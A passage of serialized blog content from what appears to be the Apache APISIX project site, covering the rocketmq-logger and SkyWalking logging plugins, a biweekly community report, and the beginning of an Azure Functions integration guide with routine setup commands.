successfully](https://static.apiseven.com/202108/1639101644015-6d541202-dfff-4de3-ad47-f49dd65911a6.png)\\n\\n#### Logout\\n\\nAfter the test, use your browser to access \\"http:/127.0.0.1:9080/logout\\" to logout your account.\\n\\n> Note: The logout path can be specified by `logout_path` in the OpenID-Connect plug-in configuration, the default is `logout`.\\n\\n## Summary\\n\\nThis article shows the procedure of using OpenID-Connect protocol and Keycloak for authentication in Apache APISIX. By integrating with Keycloak, Apache APISIX can be configured to authenticate and authenticate users and application services, which greatly reduces the development work involved.\\n\\nFor more information about the implementation of authentication in Apache APISIX with Okta, see [this article](https://apisix.apache.org/zh/blog/2021/08/16/Using-the-Apache-APISIX-OpenID-Connect-Plugin-for-Centralized-Authentication/)."},{"id":"API Log Monitor with Apache APISIX & RocketMQ","metadata":{"permalink":"/blog/2021/12/08/apisix-integrate-rocketmq-logger-plugin","source":"@site/blog/2021/12/08/apisix-integrate-rocketmq-logger-plugin.md","title":"API Log Monitor with Apache APISIX & RocketMQ","description":"The rocketmq-logger log plugin added by the API gateway Apache APISIX can help you connect with the RocketMQ cluster more conveniently when using APISIX.","date":"2021-12-08T00:00:00.000Z","formattedDate":"December 8, 2021","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.895,"truncated":true,"authors":[{"name":"Zhou Yu","title":"Author","url":"https://github.com/yuz10","image_url":"https://avatars.githubusercontent.com/u/14816818?v=4","imageURL":"https://avatars.githubusercontent.com/u/14816818?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"API Gateway APISIX Integrates Keycloak for Authentication","permalink":"/blog/2021/12/10/integrate-keycloak-auth-in-apisix"},"nextItem":{"title":"Apache APISIX Integrates with SkyWalking for Log Processing","permalink":"/blog/2021/12/07/apisix-integrate-skywalking-plugin"}},"content":"> This article will introduce the latest integration of Apache APISIX and Apache RocketMQ rocketmq-logger plugin features and use. With this plugin, you can connect to the RocketMQ cluster more easily when using Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\nSince Apache RocketMQ came to the global developers\' attention in 2016, it has grown to become the core data base of the technology middle office in multiple fields such as e-commerce, finance, education, and technology.\\n\\nAccording to incomplete statistics, more than 70% of domestic users (including top 100 enterprises in various fields such as finance, insurance, wealth and brokerage) have deployed Apache RocketMQ at scale on their core application links, including the top 5 global cloud vendors have also launched cloud product services about Apache RocketMQ.\\n\\nIn addition to regular applications for core business message processing, a large number of companies are using Apache RocketMQ for log processing and analysis.\\n\\n## Plug-in Introduction\\n\\nTo meet the needs of enterprise users for log processing, Apache APISIX has released `rocketmq-logger`, a logging plugin based on Apache RocketMQ that supports pushing API interface request logs to RocketMQ clusters as JSON.\\n\\nThe plugin uses the TCP protocol natively supported by RocketMQ, and achieves high concurrency and high performance access through the non-blocking TCP socket API provided by OpenResty.\\n\\nAlso, the API log format sent using the `rocketmq-logger` plugin is the same as other logging plugins, with support for bulk logging, custom log formats, retry support, and other features.\\n\\nIn addition, the plug-in also supports TLS encrypted transmission, as well as configuring AK, SK authentication to access Apache RocketMQ, to meet the needs of users for data security.\\n\\n## How to Use\\n\\n### Start RocketMQ\\n\\nStart RocketMQ locally with the following command, for details refer to the [official documentation](https://rocketmq.apache.org/docs/quick-start/).\\n\\n```shell\\nwget https://dlcdn.apache.org/rocketmq/4.9.2/rocketmq-all-4.9.2-bin-release.zip\\n\\nunzip rocketmq-all-4.9.2-bin-release.zip\\n\\ncd rocketmq-4.9.2/\\n\\nnohup sh bin/mqnamesrv &\\n\\nnohup sh bin/mqbroker -n 127.0.0.1:9876 -c conf/broker.conf &\\n```\\n\\n### Enable the plugin in Apache APISIX\\n\\nEnabling the `rocketmq-logger` plugin for a given route in a production environment requires only a single command.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n       \\"rocketmq-logger\\": {\\n           \\"nameserver_list\\" : [ \\"127.0.0.1:9876\\" ],\\n           \\"topic\\" : \\"test\\",\\n       }\\n    },\\n    \\"upstream\\": {\\n       \\"nodes\\": {\\n           \\"127.0.0.1:1980\\": 1\\n       },\\n       \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"uri\\": \\"/hello\\"\\n}\'\\n```\\n\\nWhen the `rocketmq-logger` plugin is enabled, any request to the endpoint `URI/hello` will push the log to Apache RocketMQ.\\n\\nDetails of the specific supported parameters can be found in the following table.\\n\\n| Name             | Type    | Description                                             |\\n| ---------------- | ------- |  ------------------------------------------------ |\\n| nameserver_list  | object  | Nameserver list of rocketmq to be pushed.|\\n| topic            | string  | The topic to be pushed.                  |\\n| key              | string  | The keys that sent the message.          |\\n| tag              | string  | The tags that sent the message.          |\\n| timeout          | integer | The timeout for sending data.            |\\n| use_tls          | boolean | Whether to enable TLS encryption.        |\\n| access_key       | string  | An empty access key, string certified by ACL indicates that ACL is not enabled.     |\\n| secret_key       | string  | ACL certified secret key.                |\\n\\n#### Plugin metadata settings\\n\\nOf course, if you do not want to use the default log format during use, you can also set the metadata for the plugin.\\n\\nThe first thing you can do is to adjust the relevant log format in the form of a template.\\n\\n| Name             |  Default Value |  Description                                             |\\n| ---------------- |  ------------- | ------------------------------------------------ |\\n| log_format       |  {\\"host\\": \\"$host\\", \\"@timestamp\\": \\"$time_iso8601\\", \\"client_ip\\": \\"$remote_addr\\"} |    Declare the log format as a key-value pair in JSON format. For the value section, only strings are supported. If it starts with `$`, it indicates that you want to get the __APISIX__ variable or [Nginx built-in variable](http://nginx.org/en/docs/varindex.html). In particular, __this setting takes effect globally__, which means that when log_format is specified, it will take effect on all Route or Service bound to http-logger. |\\n\\nOnce the log format is adjusted, you need to send a request to the `/apisix/admin/plugin_metadata` endpoint to update the metadata, as described in the code below.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/plugin_metadata/rocketmq-logger -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"log_format\\": {\\n        \\"host\\": \\"$host\\",\\n        \\"@timestamp\\": \\"$time_iso8601\\",\\n        \\"client_ip\\": \\"$remote_addr\\"\\n    }\\n}\'\\n```\\n\\n## Disable the Plugin\\n\\nIf you no longer use the plugin, you can disable the `rocketmq-logger` plugin by removing the appropriate JSON configuration from the plugin configuration. This process does not require a restart of the service and will take effect immediately by entering the code below.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {},\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    }\\n}\'\\n```"},{"id":"Apache APISIX Integrates with SkyWalking for Log Processing","metadata":{"permalink":"/blog/2021/12/07/apisix-integrate-skywalking-plugin","source":"@site/blog/2021/12/07/apisix-integrate-skywalking-plugin.md","title":"Apache APISIX Integrates with SkyWalking for Log Processing","description":"This paper mainly introduces two Apache APISIX integrated SkyWalking log plugins to provide a more convenient operation and environment for log processing in Apache APISIX.","date":"2021-12-07T00:00:00.000Z","formattedDate":"December 7, 2021","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.37,"truncated":true,"authors":[{"name":"Haochao Zhuang","title":"Author","url":"https://github.com/dmsolr","image_url":"https://avatars.githubusercontent.com/u/29735230?v=4","imageURL":"https://avatars.githubusercontent.com/u/29735230?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"API Log Monitor with Apache APISIX & RocketMQ","permalink":"/blog/2021/12/08/apisix-integrate-rocketmq-logger-plugin"},"nextItem":{"title":"Biweekly Report (Nov.15 - Nov.30)","permalink":"/blog/2021/12/02/weekly-report-1130"}},"content":"> This paper mainly introduces two Apache APISIX integrated SkyWalking log plug-ins to provide a more convenient operation and environment for log processing in Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\nIn the field of observability, the three main directions of data collection and analysis, Metrics, Logger and Tracing, are usually used to achieve insight into the operational status of applications.\\n\\nApache APISIX has integrated Apache SkyWaling Tracing capabilities as early as version 1.4, with features such as error logging and access log collection added in subsequent versions. Now with Apache SkyWalking\'s support for Metrics, it enables Apache APISIX to implement a one-stop observable solution in integrated mode, covering both logging, metrics and call tracing.\\n\\n## Feature Development Background\\n\\nThose of you who are familiar with Apache APISIX should know that Apache APISIX produces two types of logs during operation, namely the access log and the error log.\\n\\nAccess logs record detailed information about each request and are logs generated within the scope of the request, so they can be directly associated with Tracing. Error logs, on the other hand, are Apache APISIX runtime output log messages, which are application-wide logs, but cannot be 100% associated with requests.\\n\\nAt present, Apache APISIX provides very rich log processing plug-ins, including TCP/HTTP/Kafka and other collection and reporting plug-ins, but they are weakly associated with Tracing. Take Apache SkyWalking as an example. We extract the SkyWalking Tracing Conetxt Header from the log records of Apache APISIX and export it to the file system, and then use the log processing framework (fluentbit) to convert the logs into a log format acceptable to SkyWalking. The Tracing Context is then parsed and extracted to obtain the Tracing ID to establish a connection with the Trace.\\n\\nObviously, the above way of handling the process is tedious and complicated, and requires additional conversion of log formats. For this reason, in [PR#5500](https://github.com/apache/apisix/pull/5550) we have implemented the Apache SkyWalking access log into the Apache APISIX plug-in ecosystem to make it easier for users to collect and process logs using Apache SkyWalking in Apache APISIX.\\n\\n## Introduction of the New Plugins\\n\\n### SkyWalking Logger Plugin\\n\\nThe SkyWalking Logger plugin parses the SkyWalking Tracing Context Header and prints the relevant Tracing Context information to the log, thus enabling the log to be associated with the call chain.\\n\\nBy using this plug-in, Apache APISIX can get the SkyWalking Tracing Context and associate it with Tracing even if the SkyWalking Tracing plug-in is not turned on, if Apache SkyWalking is already integrated downstream.\\n\\n![Log content](https://static.apiseven.com/202108/1638781626018-da50a39d-da16-4914-b4f5-8ac9b4312e19.png)\\n\\nThe above Content is the log content, where the Apache APISIX metadata configuration is used to collect request-related information. You can later modify the Log Format to customize the log content by Plugin Metadata, please refer to the [official documentation.](https://apisix.apache.org/docs/apisix/plugins/skywalking-logger#metadata)\\n\\n#### How to Use\\n\\nWhen using this plugin, since the SkyWalking plugin is \\"not enabled\\" by default, you need to manually modify the `plugins` section in the `conf/default-apisix.yaml` file to enable the plugin.\\n\\n```yaml\\nplugins:\\n  ...\\n  - error-log-logger\\n  ...\\n```\\n\\nThen you can use the SkyWalking Tracing plug-in to get the tracing data directly, so you can verify that the Logging plug-in-related features are enabled and working properly.\\n\\n##### Step 1: Create a route\\n\\nNext, create a route and bind the SkyWalking Tracing plugin and the SkyWalking Logging plugin. More details of the plugin configuration can be found in the [official Apache APISIX documentation](https://apisix.apache.org/docs/apisix/plugins/skywalking-logger).\\n\\n```shell\\ncurl -X PUT \'http://192.168.0.108:9080/apisix/admin/routes/1001\' \\\\\\n-H \'X-API-KEY:  edd1c9f034335f136f87ad84b625c8f1\' \\\\\\n-H \'Content-Type: application/json\' \\\\\\n-d \'{\\n    \\"uri\\": \\"/get\\",\\n    \\"plugins\\": {\\n        \\"skywalking\\": {\\n            \\"sample_ratio\\": 1\\n        },\\n        \\"skywalking-logger\\": {\\n            \\"endpoint_addr\\": \\"http://127.0.0.1:12800\\"\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"httpbin.org:80\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\n##### Step 2: Log Processing\\n\\nOn the Apache SkyWalking side, you can use LAL (Logger Analysis Language) scripts for log processing, such as Tag extraction, SkyWalking metadata correction, and so on.\\n\\nThe main purpose of Tag extraction here is to facilitate subsequent retrieval and to add dependencies to the Metrics statistics. The following code can be used to configure the SkyWalking LAL script to complete the Tag extraction. For more information on how to use the SkyWalking LAL script, please refer to the [official Apache SkyWalking documentation](https://skywalking.apache.org/docs/main/latest/en/concepts-and-designs/lal/).\\n\\n```yaml\\n# The default LAL script to save all logs, behaving like the versions before 8.5.0.\\nrules:\\n  - name: default\\n    dsl: |\\n      filter {\\n        json {\\n          abortOnFailure false\\n        }\\n\\n        extractor {\\n          tag routeId: parsed.route_id\\n          tag upstream: parsed.upstream\\n          tag clientIp: parsed.client_ip\\n          tag latency: parsed.latency\\n        }\\n\\n        sink {\\n        }\\n      }\\n```\\n\\nAfter configuring the above LAL script in SkyWalking OAP Server the following log will be displayed.\\n\\n![LALscript details](https://static.apiseven.com/202108/1638781696137-6ba3a486-08c0-49e1-bc57-e144f95918a2.png)\\n\\nDetails of the expanded log are as follows.\\n\\n![Expanded log](https://static.apiseven.com/202108/1638781751540-d597ace7-1de1-4baf-b361-1c136dfe5e05.png)\\n\\nAs you can see from the above, displaying `routeId`, `upstream` and `clientIp` as key-value pairs is much easier than searching directly in the log body. This is because the Tag format not only supports log display format and search, but also generates information such as Metrics using MAL statistics.\\n\\n### SkyWalking Error Logger Plugin\\n\\nThe error-log-logger plug-in now supports the SkyWalking log format, and you can now use the http-error-log plug-in to quickly connect Apache APISIX error logs to Apache SkyWalking. Currently, error logs do not have access to SkyWalking Tracing Context information, and therefore cannot be directly associated with SkyWalking Tracing.\\n\\nThe main reason for the error log to be integrated into SkyWalking is to centralize the Apache APISIX log data and to make it easier to view all observable data within SkyWalking.\\n\\n![SkyWalking dashboard](https://static.apiseven.com/202108/1638781827612-f7d88e0e-0159-44ba-bc1e-b718695bc3b8.png)\\n\\n#### How to Use\\n\\nSince the error-log-logger plugin is \\"not enabled\\" by default, you still need to enable the plugin in the way mentioned above.\\n\\n```yaml\\nplugins:\\n  ...\\n  - error-log-logger\\n  ...\\n```\\n\\n##### Step 1: Bind the route\\n\\nAfter enabling, you need to bind the plugin to routes or global rules. Here we take \\"bind routes\\" as an example.\\n\\n```shell\\ncurl -X PUT \'http://192.168.0.108:9080/apisix/admin/plugin_metadata/error-log-logger\' \\\\\\n-H \'X-API-KEY:  edd1c9f034335f136f87ad84b625c8f1\' \\\\\\n-H \'Content-Type: application/json\' \\\\\\n-d \'{\\n    \\"inactive_timeout\\": 10,\\n    \\"level\\": \\"ERROR\\",\\n    \\"skywalking\\": {\\n        \\"endpoint_addr\\": \\"http://127.0.0.1:12800/v3/logs\\"\\n    }\\n}\'\\n```\\n\\n>Note that the `endpoint_addr` is the SkyWalking OAP Server address and needs to have the URI (i.e. `/v3/logs`).\\n\\n##### Step 2: LAL Processing\\n\\nIn much the same way as the Access Log processing, the logs are also processed by LAL when they reach SkyWalking OAP Server. Therefore, we can still use the SkyWalking LAL script to analyze and process the log messages.\\n\\nIt is important to note that the Error Log message body is in text format. If you are extracting tags, you will need to use regular expressions to do this. Unlike Access Log, which handles the message body in a slightly different way, Acces Log uses JSON format and can directly reference the fields of the JSON object using JSON parsing, but the rest of the process is largely the same.\\n\\nTags can also be used to optimize the display and retrieval for subsequent metrics calculations using SkyWalking MAL.\\n\\n```json\\nrules:\\n  - name: apisix-errlog\\n    dsl: |\\n      filter {\\n        text {\\n          regexp \\"(?<datetime>\\\\\\\\d{4}/\\\\\\\\d{2}/\\\\\\\\d{2} \\\\\\\\d{2}:\\\\\\\\d{2}:\\\\\\\\d{2}) \\\\\\\\[(?<level>\\\\\\\\w+)\\\\\\\\] \\\\\\\\d+\\\\\\\\#\\\\\\\\d+:( \\\\\\\\*\\\\\\\\d+ \\\\\\\\[(?<module>\\\\\\\\w+)\\\\\\\\] (?<position>.*\\\\\\\\.lua:\\\\\\\\d+): (?<function>\\\\\\\\w+\\\\\\\\(\\\\\\\\)):)* (?<msg>.+)\\"\\n        }\\n        extractor {\\n          tag level: parsed.level\\n          if (parsed?.module) {\\n            tag module: parsed.module\\n            tag position: parsed.position\\n            tag function: parsed.function\\n          }\\n        }\\n        sink {\\n        }\\n      }\\n```\\n\\nAfter the LAL script used by SkyWalking OAP Server, some of the Tags will be extracted from the logs, as shown below.\\n\\n![Tags details](https://static.apiseven.com/202108/1638781886771-b98c80de-4ea2-4cf3-ad1c-26250da231f7.png)\\n\\n## Summary\\n\\nThis article introduces two logging plug-ins for Apache APISIX that integrate with SkyWalking to provide a more convenient operation and environment for logging in Apache APISIX afterwards.\\n\\nWe hope that through this article, you will have a fuller understanding of the new features and be able to use Apache APISIX for centralized management of observable data more conveniently in the future."},{"id":"Biweekly Report (Nov.15 - Nov.30)","metadata":{"permalink":"/blog/2021/12/02/weekly-report-1130","source":"@site/blog/2021/12/02/weekly-report-1130.md","title":"Biweekly Report (Nov.15 - Nov.30)","description":"Apache APISIX adds the azure-functions, google-cloud-logging and openwhisk plugins, and the kafka-logger plugin to support logging request and response bodies and many other functions.","date":"2021-12-02T00:00:00.000Z","formattedDate":"December 2, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.81,"truncated":true,"authors":[],"prevItem":{"title":"Apache APISIX Integrates with SkyWalking for Log Processing","permalink":"/blog/2021/12/07/apisix-integrate-skywalking-plugin"},"nextItem":{"title":"Apache APISIX\'s integration with Azure Serverless","permalink":"/blog/2021/12/01/apisix-supports-azure-functions"}},"content":"> From 11.15 to 11.30, 37 contributors submitted 87 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX. It is your selfless contribution to make the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1638346484091-37307b33-3e48-402f-9a72-3819e4217b29.png)\\n\\n![New Contributors](https://static.apiseven.com/202108/1638346484108-354ecbdd-a872-4a8f-b5c6-4903bad44eca.png)\\n\\n## Good first issue\\n\\n### Issue #5451\\n\\n**Link**: https://github.com/apache/apisix/issues/5451\\n\\n**Issue description**:\\n\\nNginx comes with a response content replacement library that can replace partial content: http://nginx.org/en/docs/http/ngx_http_sub_module.html\\n\\n```Nginx\\nsub_filter \'<a href=\\"http://127.0.0.1:8080/\'  \'<a href=\\"https://$host/\';\\n```\\n\\nThere is a library that supports regular substitution (as I remember Openresty already supports it by default): ngx_http_substitutions_filter_module, which can replace content with regular expressions: ngx_http_substitutions_filter_module\\n\\n```Nginx\\nsubs_filter_types text/html text/css text/xml;\\nsubs_filter st(\\\\d*).example.com $1.example.com ir;\\nsubs_filter a.example.com s.example.com;\\nsubs_filter http://$host https://$host;\\n```\\n\\nHowever, it seems that APISIX\'s response-rewrite plugin only supports full replacement, which is equivalent to directly replacing all responses with the return set by the plugin, and does not support partial content replacement:\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uri\\": \\"/test/index.html\\",\\n    \\"plugins\\": {\\n        \\"response-rewrite\\": {\\n            \\"body\\": \\"{\\\\\\"code\\\\\\":\\\\\\"ok\\\\\\",\\\\\\"message\\\\\\":\\\\\\"new json body\\\\\\"}\\",\\n            \\"headers\\": {\\n                \\"X-Server-id\\": 3,\\n                \\"X-Server-status\\": \\"on\\",\\n                \\"X-Server-balancer_addr\\": \\"$balancer_ip:$balancer_port\\"\\n            },\\n            \\"vars\\":[\\n                [ \\"status\\",\\"==\\",\\"200\\" ]\\n            ]\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:80\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\nDoes this plugin support partial replacement or regular replacement? If not, is there any other solution for APISIX?\\n\\n### Issue #5647\\n\\n**Link**: https://github.com/apache/apisix/issues/5647\\n\\n**Issue description**:\\n\\nThe current documentation provides a way to install APISIX directly using RPM on CentOS7, but the current APISIX has switched its dependency to apisix-base version without providing its RPM installation method, which will cause the installation to fail.\\n\\n![Issue Screenshot](https://static.apiseven.com/202108/1638346839201-3efb9807-13a7-4106-968a-5198b22d1a67.png)\\n\\nIs it possible to add the command for installing the RPM for apisix-base.\\n\\n## Highlights of Recent Features\\n\\n- [kafka-logger supports logging request body](https://github.com/apache/apisix/pull/5501)\uff08Contributor: [windyrjc](https://github.com/windyrjc)\uff09\\n\\n- [New azure-functions plugin, seamlessly integrated with Azure Serverless Function](https://github.com/apache/apisix/pull/5479)\uff08Contributor: [bisakhmondal](https://github.com/bisakhmondal)\uff09\\n\\n- [The WASM plugin supports running in the header_filter phase](https://github.com/apache/apisix/pull/5544)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [New google-cloud-logging plugin for pushing logs to Google Cloud logging Service](https://github.com/apache/apisix/pull/5538)\uff08Contributor: [shuaijinchao](https://github.com/shuaijinchao)\uff09\\n\\n- [New openwhisk plugin, integrated with Apache OpenWhisk serverless platform](https://github.com/apache/apisix/pull/5518)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [kafka-logger and http support logging response bodies](https://github.com/apache/apisix/pull/5550)\uff08Contributor: [dmsolr](https://github.com/dmsolr)\uff09\\n\\n- [Enriched mTLS support in APISIX Ingress for HTTPS and gRPCs type upstream](https://github.com/apache/apisix-ingress-controller/pull/755)\uff08Contributor: [nic-6443](https://github.com/nic-6443)\uff09\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [Using Apache APISIX Ingress Gateway to access Custom Monitoring in KubeSphere](https://apisix.apache.org/blog/2021/11/30/use-apisix-ingress-in-kubesphere)\uff1a\\n\\n  This article will take Apache APISIX Ingress Controller as an example to show you in detail how to quickly use different types of gateways and status monitoring for Kubernetes clusters through KubeSphere.\\n\\n- [Contributer to Committer journey @Apache APISIX](https://apisix.apache.org/blog/2021/11/26/apache-apisix-committer-experience)\uff1a\\n\\n  In this article, Shivam Singh ([@1502shivam-singh](https://github.com/1502shivam-singh)) gives a brief of his journey from starting out in the Apache APISIX community, from a contributor to an Apache member and APISIX committer. His journey can help other people looking to startup in the Apache APISIX community or Open Source in general.\\n\\n- [Developing APISIX Ingress Controller with Nocalhost in Kubernetes](https://apisix.apache.org/blog/2021/11/22/develop-apisix-ingress-with-nocalhost-in-kubernetes)\uff1a\\n\\n  This article walks you through using Nocalhost to seamlessly connect your local development machine to a remote Kubernetes cluster, allowing you to use IDE to develop and debug Apache APISIX Ingress Controller. Giving you the ability to comfortably develop and debug your remote apps with your existing skills.\\n\\n- [Apache APISIX embraces the WASM ecosystem](https://apisix.apache.org/blog/2021/11/19/apisix-supports-wasm)\uff1a\\n\\n  Support for WASM will be added in the upcoming Apache APISIX version (2.11.0)! By reading this article you will learn how Apache APISIX deploys the support and development of this feature from 0 to 1.\\n\\n- [How to integrate with Dapr to build Apache APISIX Gateway Controller](https://apisix.apache.org/blog/2021/11/17/dapr-with-apisix)\uff1a\\n\\n  This article will show you how to create an Apache APISIX controller by integrating Dapr, includes the concept of the project and the specific operation steps."},{"id":"Apache APISIX\'s integration with Azure Serverless","metadata":{"permalink":"/blog/2021/12/01/apisix-supports-azure-functions","source":"@site/blog/2021/12/01/apisix-supports-azure-functions.md","title":"Apache APISIX\'s integration with Azure Serverless","description":"This article  gives detailed instructions on how to integrate Azure Functions, which is a widely used serverless solution, into the Apache APISIX serverless suite.","date":"2021-12-01T00:00:00.000Z","formattedDate":"December 1, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.975,"truncated":true,"authors":[{"name":"Bisakh Mondal","url":"https://github.com/bisakhmondal","imageURL":"https://avatars.githubusercontent.com/u/41498427?v=4"}],"prevItem":{"title":"Biweekly Report (Nov.15 - Nov.30)","permalink":"/blog/2021/12/02/weekly-report-1130"},"nextItem":{"title":"Release Apache APISIX 2.11.0","permalink":"/blog/2021/12/01/release-apache-apisix-2.11"}},"content":"> This article talks about the recent addition of a new plugin `azure-functions`, and gives detailed instructions on how to integrate Azure Functions, which is a widely used serverless solution, into the Apache APISIX serverless suite.\\n\\n\x3c!--truncate--\x3e\\n\\n![Apache APISIX\'s integration with Azure Serverless](https://static.apiseven.com/202108/1638431191799-e1202fc7-d3b5-48db-a222-0c70a8b70da0.png)\\n\\nApache APISIX provides support for serverless frameworks for popular cloud vendors (more coming on the way). Instead of hardcoding the function URL into the application, Apache APISIX suggests defining a route with the serverless plugin enabled. It gives the developers the flexibility to hot update the function URI along with completely changing the faas vendor to a different cloud provider with zero hassle. Also, this approach mitigates authorization and authentication concerns from application logic as Apache APISIX has very strong authentication support that could be used to identify and authorize client consumers to access the particular route with the faas. This article talks about the recent addition of a new plugin `azure-functions`, and gives detailed instructions on how to integrate Azure Functions, which is a widely used serverless solution, into the Apache APISIX serverless suite.\\n\\n## How azure-functions plugin works\\n\\nThe `azure-functions` plugin lets the users define an upstream to the azure `HTTP Trigger` serverless function for a gateway URI. If enabled, this plugin terminates the ongoing request to that particular URI and initiates a new request to the azure faas (the new upstream) on behalf of the client with the suitable authorization details set by the users, request headers, request body, params(all these three components are passed from the original request) and returns the response body, status code and the headers back to the original client that has invoked the request to the Apache APISIX agent.\\n\\nThe plugin supports authorization to azure faas service via API keys and azure active directory.\\n\\n## How to Use Azure Functions with Apache APISIX\\n\\nThe primary goal of the plugin is to proxy the gateway route specified in the route configuration to the azure functions URI. This section gives you a hands-on how to configure and create a serverless HTTP Trigger on the azure cloud.\\n\\n1. First sign up/in to Microsoft Azure and sets up a trial plan. Azure Functions are forever free up to 1 million invocations. To know more about how the pricing, visit [here](https://azure.microsoft.com/en-us/services/functions/#pricing).\\n\\n1. Visit the [Azure Portal](https://portal.azure.com/#home) (FYI, azure services can be accessed via the web portal, CLI & VSCode. for user-friendliness we are using the web).\\n    1. First, create a resource group to logically partition your faas that\'s you are going to create.\\n    ![create a resource group](https://static.apiseven.com/202108/1638349069240-911b8640-2de6-4f82-b75b-fb937b0bad40.png)\\n    1. Create a function app with the URL of your choice (I am going to pick test-apisix).\\n    ![create a function app](https://static.apiseven.com/202108/1638349121520-01abe8e6-bc09-4be7-b010-f7baec59f89a.png)\\n\\n1. Install the [Azure Functions extension](https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-azurefunctions) into VSCode editor. Upon installation, authenticate via extension and install the azure function core tool for local development with:\\n\\n    ```shell\\n    npm install -g azure-functions-core-tools@3 --unsafe-perm true\\n    ```\\n\\n1. Deploy the following snippet to the same function app that we just created via the Azure Functions extension panel in VSCode:\\n\\n    ```javascript\\n    module.exports = async function (context, req) {\\n    context.log(\'HTTP trigger invoked on Test-APISIX.\')\\n\\n    const name = req.query.name || (req.body && req.body.name)\\n    const responseMessage = name\\n        ? \'Hello, \' + name\\n        : \'This HTTP triggered function executed successfully. Pass a name in the query string or in the request body to generate a personalized response.\'\\n\\n    context.res = {\\n        // status: 200, /* Defaults to 200 */\\n        body: responseMessage,\\n    }\\n    }\\n    ```\\n\\n> This snippet takes the name from query parameters (if present, else from the request body) and greets the user.\\n\\n### Activate the azure-functions plugin\\n\\nThe following is an example of how to enable the azure-functions plugin for a specific route. We are assuming your HTTP Trigger is deployed and ready to be served.\\n\\n```shell\\n# enable plugin for a specific route\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"azure-functions\\": {\\n            \\"function_uri\\": \\"http://test-apisix.azurewebsites.net/api/HttpTrigger\\",\\n            \\"authorization\\": {\\n                \\"apikey\\": \\"<Generated API key to access the Azure-Function>\\"\\n            }\\n        }\\n    },\\n    \\"uri\\": \\"/azure\\"\\n}\'\\n```\\n\\nNow any requests (HTTP/1.1, HTTPS, HTTP2) to URI `/azure` on the Apache APISIX gateway will trigger an HTTP invocation to the aforesaid function URI and response body along with the response headers and response code will be proxied back to the client. For example ( here azure cloud function just take the `name` query param and returns `Hello $name`):\\n\\n```shell\\ncurl -i -XGET http://localhost:9080/azure\\\\?name=Bisakh\\nHTTP/1.1 200 OK\\nContent-Type: text/plain; charset=utf-8\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\nRequest-Context: appId=cid-v1:38aae829-293b-43c2-82c6-fa94aec0a071\\nDate: Wed, 19 Nov 2021 18:46:55 GMT\\nServer: APISIX/2.10.2\\n\\nHello, Bisakh\\n```\\n\\nConsidering, Apache APISIX is also running with `enable_http2: true` on [config-default.yaml](https://github.com/apache/apisix/blob/master/conf/config-default.yaml#L26) for port 9081 (say), any `HTTP/2` communication between client and APISIX agent will be proxied to the azure faas similar to HTTP/1.1 and responses will be proxied back to the client with proper headers. For example:\\n\\n```shell\\ncurl -i -XGET --http2 --http2-prior-knowledge 